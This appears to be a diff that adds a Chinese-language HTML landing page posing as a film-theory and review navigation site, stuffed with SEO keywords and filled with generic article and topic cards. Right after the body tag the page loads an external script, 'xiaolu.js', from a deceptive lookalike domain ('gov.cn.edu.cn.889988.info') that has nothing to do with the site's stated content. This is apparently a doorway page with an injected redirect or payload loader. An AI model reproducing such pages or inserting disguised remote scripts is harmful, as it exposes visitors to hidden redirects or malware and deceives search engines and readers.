@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="秋霞电影网理论片,qiuxiadianyingwanglilunpian,秋霞电影网,电影理论,影视赏析,高分影视">
+<meta name="description" content="秋霞电影网理论片 - 聚焦影视理论与赏析，汇集经典影片、电影评论、导演专题与观影指南，为影迷提供有深度的影视内容导航，每日精选更新。">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>秋霞电影网理论片 | 影视理论与经典赏析 · 影迷导航</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--amber:#b45309;--amber2:#d97706;--leaf:#65a30d;--paper:#fdfbf5;--ink:#292524;--txt:#57534e;--dim:#a8a29e;--line:#f0e6d4}
+body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",serif;background:var(--paper);color:var(--ink);line-height:1.7;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1120px;margin:0 auto;padding:0 16px}
+section{padding:50px 0}
+img{max-width:100%}
+
+/* HEADER */
+header{position:sticky;top:0;z-index:70;background:rgba(253,251,245,.95);backdrop-filter:blur(10px);border-bottom:2px solid var(--line)}
+.hd{display:flex;align-items:center;justify-content:space-between;height:72px}
+.logo{display:flex;align-items:center;gap:12px}
+.logo .kw{width:44px;height:44px;border-radius:50%;background:var(--ink);color:var(--amber2);display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:900}
+.logo b{font-size:16px;font-weight:900}
+.logo small{display:block;font-size:9px;color:var(--dim);letter-spacing:1.6px;font-family:Georgia,serif;font-style:italic}
+nav{display:none;gap:4px}
+nav a{padding:9px 15px;border-radius:20px;font-size:12.5px;font-weight:800;color:var(--txt);transition:.25s}
+nav a:hover,nav a.on{background:var(--ink);color:var(--amber2)}
+.tog{width:42px;height:42px;border-radius:50%;background:var(--ink);color:var(--amber2);border:none;font-size:15px;cursor:pointer}
+.drawer{display:none;background:#fff;border-bottom:2px solid var(--line)}
+.drawer.on{display:block}
+.drawer a{display:block;padding:14px 16px;border-bottom:1px solid #faf4e8;font-weight:800;font-size:14px}
+
+/* HERO */
+.hero{position:relative;background:linear-gradient(120deg,#292524,#44403c);color:#fff;padding:70px 0;overflow:hidden}
+.hero::before{content:"❝";position:absolute;right:20px;top:0;font-size:220px;color:rgba(217,119,6,.08);font-family:Georgia,serif;line-height:.8}
+.hero .wrap{position:relative;z-index:2}
+.hero .kicker{font-family:Georgia,serif;font-style:italic;color:var(--amber2);font-size:12px;letter-spacing:2px;margin-bottom:14px}
+.hero h1{font-size:28px;font-weight:900;line-height:1.4;margin-bottom:14px}
+.hero h1 em{font-style:normal;color:var(--amber2)}
+.hero p{font-size:13px;color:#d6d3d1;max-width:560px;margin-bottom:26px}
+.hero .acts{display:flex;gap:10px;flex-wrap:wrap}
+.hero .acts .a{background:var(--amber2);color:#fff;padding:12px 24px;border-radius:30px;font-size:12.5px;font-weight:900}
+.hero .acts .b{background:transparent;color:#fff;border:1px solid rgba(255,255,255,.35);padding:12px 24px;border-radius:30px;font-size:12.5px;font-weight:800}
+
+/* SECTION TITLE */
+.stitle{text-align:center;margin-bottom:30px}
+.stitle .en{font-family:Georgia,serif;font-style:italic;font-size:11px;letter-spacing:3px;color:var(--amber2)}
+.stitle h2{font-size:21px;font-weight:900;margin-top:4px}
+.stitle h2 i{font-style:normal;color:var(--amber)}
+
+/* QUOTE / ARTICLE DOM A */
+.articles{display:grid;grid-template-columns:1fr;gap:18px}
+.art{background:#fff;border-radius:4px;padding:26px 24px;border-left:5px solid var(--amber2);box-shadow:0 3px 14px rgba(41,37,36,.06);transition:.28s}
+.art:hover{border-left-color:var(--leaf);transform:translateX(4px)}
+.art .num{font-family:Georgia,serif;font-size:13px;color:var(--amber2);font-weight:900;letter-spacing:1px}
+.art h3{font-size:15.5px;font-weight:900;margin:8px 0 8px}
+.art p{font-size:12px;color:var(--txt);margin-bottom:12px}
+.art .meta{display:flex;gap:10px;font-size:10.5px;color:var(--dim);flex-wrap:wrap}
+.art .meta span{background:#faf6ee;padding:3px 10px;border-radius:20px}
+
+/* THEME BLOCKS DOM B */
+.themes{display:grid;grid-template-columns:1fr;gap:14px}
+.theme{position:relative;background:#fff;border:1px solid var(--line);border-radius:6px;overflow:hidden;transition:.28s}
+.theme:hover{box-shadow:0 12px 26px rgba(41,37,36,.1)}
+.theme .cap{height:70px;display:flex;align-items:center;justify-content:center;font-size:26px;color:#fff}
+.theme .body{padding:16px}
+.theme .body b{font-size:14px;font-weight:900;display:block}
+.theme .body small{font-size:11px;color:var(--txt);line-height:1.6;display:block;margin-top:5px}
+.theme .body .go{margin-top:11px;font-size:11px;font-weight:800;color:var(--amber);display:inline-block}
+
+/* INFO TABLE DOM C */
+.info{background:#fff;border:1px solid var(--line);border-radius:6px;overflow:hidden}
+.info .row{display:flex;padding:15px 18px;border-bottom:1px solid #faf5ec;align-items:flex-start;gap:14px}
+.info .row:last-child{border-bottom:none}
+.info .row .ic{width:34px;height:34px;border-radius:50%;background:#faf6ee;color:var(--amber);display:flex;align-items:center;justify-content:center;font-size:15px;flex-shrink:0}
+.info .row .tx b{font-size:13px;font-weight:900;display:block}
+.info .row .tx small{font-size:11px;color:var(--txt)}
+
+footer{background:#292524;color:#e7e5e4;padding:46px 0 24px}
+.ft{display:grid;grid-template-columns:1fr;gap:26px}
+.ft .a b{font-size:15px;font-weight:900;color:#fff}
+.ft .a p{font-size:11.5px;margin-top:7px;color:#a8a29e}
+.ft .a .u{color:var(--amber2);font-size:11.5px;display:block;margin-top:9px;word-break:break-all}
+.cols{display:grid;grid-template-columns:repeat(2,1fr);gap:9px}
+.cols a{font-size:12px;color:#a8a29e)}
+.cols a:hover{color:var(--amber2)}
+.cp{margin-top:26px;padding-top:15px;border-top:1px solid rgba(255,255,255,.1);font-size:10px;line-height:1.95;color:#78716c}
+
+#top{position:fixed;right:14px;bottom:18px;z-index:90;width:44px;height:44px;border-radius:50%;background:var(--ink);color:var(--amber2);font-size:16px;display:none;align-items:center;justify-content:center;cursor:pointer}
+#top.on{display:flex}
+
+@media(min-width:620px){.articles{grid-template-columns:repeat(2,1fr)}.themes{grid-template-columns:repeat(2,1fr)}.hero h1{font-size:38px}}
+@media(min-width:820px){
+ nav{display:flex}.tog{display:none}
+ .hero h1{font-size:46px;max-width:780px}
+ .hero p{font-size:15px}
+ .articles{grid-template-columns:repeat(3,1fr)}.themes{grid-template-columns:repeat(3,1fr)}
+ .ft{grid-template-columns:1.6fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header>
+  <div class="wrap hd">
+    <div class="logo"><div class="kw">秋</div><div><b>秋霞电影网理论片</b><small>Cinema Theory</small></div></div>
+    <nav>
+      <a href="#home" class="on">首页</a>
+      <a href="#theo">理论专栏</a>
+      <a href="#theme">专题分类</a>
+      <a href="#about">关于本站</a>
+    </nav>
+    <button class="tog" onclick="document.getElementById('dr').classList.toggle('on')">☰</button>
+  </div>
+  <div class="drawer" id="dr">
+    <a href="#home" onclick="this.parentNode.classList.remove('on')">首页</a>
+    <a href="#theo" onclick="this.parentNode.classList.remove('on')">理论专栏</a>
+    <a href="#theme" onclick="this.parentNode.classList.remove('on')">专题分类</a>
+    <a href="#about" onclick="this.parentNode.classList.remove('on')">关于本站</a>
+  </div>
+</header>
+
+<main>
+
+<section class="hero" id="home">
+  <div class="wrap">
+    <div class="kicker">CINEMA · THEORY · APPRECIATION</div>
+    <h1>不止于观看<br>更懂<em>电影的语言</em></h1>
+    <p>秋霞电影网理论片聚焦影视理论与赏析，汇集经典影片、电影评论、导演专题与观影指南，为有深度的影迷提供专业的影视内容导航。</p>
+    <div class="acts"><a href="#theo" class="a">阅读专栏</a><a href="#theme" class="b">浏览专题</a></div>
+  </div>
+</section>
+
+<!-- ARTICLES DOM A -->
+<section id="theo">
+  <div class="wrap">
+    <div class="stitle"><div class="en">FEATURED THEORY</div><h2>理论<i>专栏</i></h2></div>
+    <div class="articles">
+      <a href="#" class="art"><div class="num">No.01</div><h3>长镜头美学的叙事力量</h3><p>从《1917》到《鸟人》，解析一镜到底如何重塑观众的时间感知与情绪沉浸。</p><div class="meta"><span>电影理论</span><span>8 分钟</span></div></a>
+      <a href="#" class="art"><div class="num">No.02</div><h3>光影与色彩的心理学</h3><p>色彩如何影响情绪？拆解经典影片中冷暖色调的隐喻与叙事功能。</p><div class="meta"><span>视听语言</span><span>6 分钟</span></div></a>
+      <a href="#" class="art"><div class="num">No.03</div><h3>导演作者论再思考</h3><p>在工业化制片时代，作者导演是否还存在？重读作者论对当代电影的意义。</p><div class="meta"><span>评论</span><span>10 分钟</span></div></a>
+    </div>
+  </div>
+</section>
+
+<!-- THEME BLOCKS DOM B -->
+<section id="theme" style="padding-top:0">
+  <div class="wrap">
+    <div class="stitle"><div class="en">CURATED THEMES</div><h2>专题<i>分类</i></h2></div>
+    <div class="themes">
+      <a href="#" class="theme"><div class="cap" style="background:linear-gradient(135deg,#b45309,#d97706)">🎞️</div><div class="body"><b>经典回眸</b><small>重温影史经典佳作，解读历久弥新的电影语言与时代印记。</small><span class="go">查看专题 →</span></div></a>
+      <a href="#" class="theme"><div class="cap" style="background:linear-gradient(135deg,#65a30d,#84cc16)">🎬</div><div class="body"><b>导演解码</b><small>深度解析知名导演的创作风格、代表作与镜头美学。</small><span class="go">查看专题 →</span></div></a>
+      <a href="#" class="theme"><div class="cap" style="background:linear-gradient(135deg,#0d9488,#14b8a6)">📖</div><div class="body"><b>类型研究</b><small>从黑色电影到太空歌剧，系统梳理各类电影类型的演变。</small><span class="go">查看专题 →</span></div></a>
+    </div>
+  </div>
+</section>
+
+<!-- INFO TABLE DOM C -->
+<section id="about" style="padding-top:0">
+  <div class="wrap">
+    <div class="stitle"><div class="en">ABOUT US</div><h2>关于<i>本站</i></h2></div>
+    <div class="info">
+      <div class="row"><div class="ic">🎯</div><div class="tx"><b>内容定位</b><small>聚焦影视理论与赏析，提供有深度的影片解读与影评导航。</small></div></div>
+      <div class="row"><div class="ic">🆕</div><div class="tx"><b>更新频率</b><small>理论专栏与专题内容持续更新，保持新鲜视角与专业观点。</small></div></div>
+      <div class="row"><div class="ic">🤝</div><div class="tx"><b>合作与投稿</b><small>欢迎影评人与电影爱好者交流投稿，共同营造优质影迷社区。</small></div></div>
+      <div class="row"><div class="ic">⚖️</div><div class="tx"><b>版权声明</b><small>本站尊重并保护影视版权，倡导正版观看，内容仅供信息导航。</small></div></div>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="ft">
+      <div class="a">
+        <b>秋霞电影网理论片</b>
+        <p>聚焦影视理论与赏析，汇集经典影片、电影评论、导演专题与观影指南，为影迷提供有深度的影视内容导航。</p>
+        <span class="u">https://qiuxiadianyingwanglilunpian-wap.github.io</span>
+      </div>
+      <div>
+        <div class="cols">
+          <a href="#">首页</a><a href="#">理论专栏</a>
+          <a href="#">专题分类</a><a href="#">关于本站</a>
+          <a href="#">影评投稿</a><a href="#">联系合作</a>
+        </div>
+      </div>
+    </div>
+    <div class="cp">© 2026 秋霞电影网理论片 qiuxiadianyingwanglilunpian · 保留所有权利<br>本站为影视信息导航与评论平台，倡导正版观看，相关影视版权归出品方及原作者所有</div>
+  </div>
+</footer>
+
+<div id="top" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</div>
+<script>
+window.addEventListener('scroll',function(){document.getElementById('top').classList.toggle('on',window.scrollY>450);});
+</script>
+</body>
+</html>
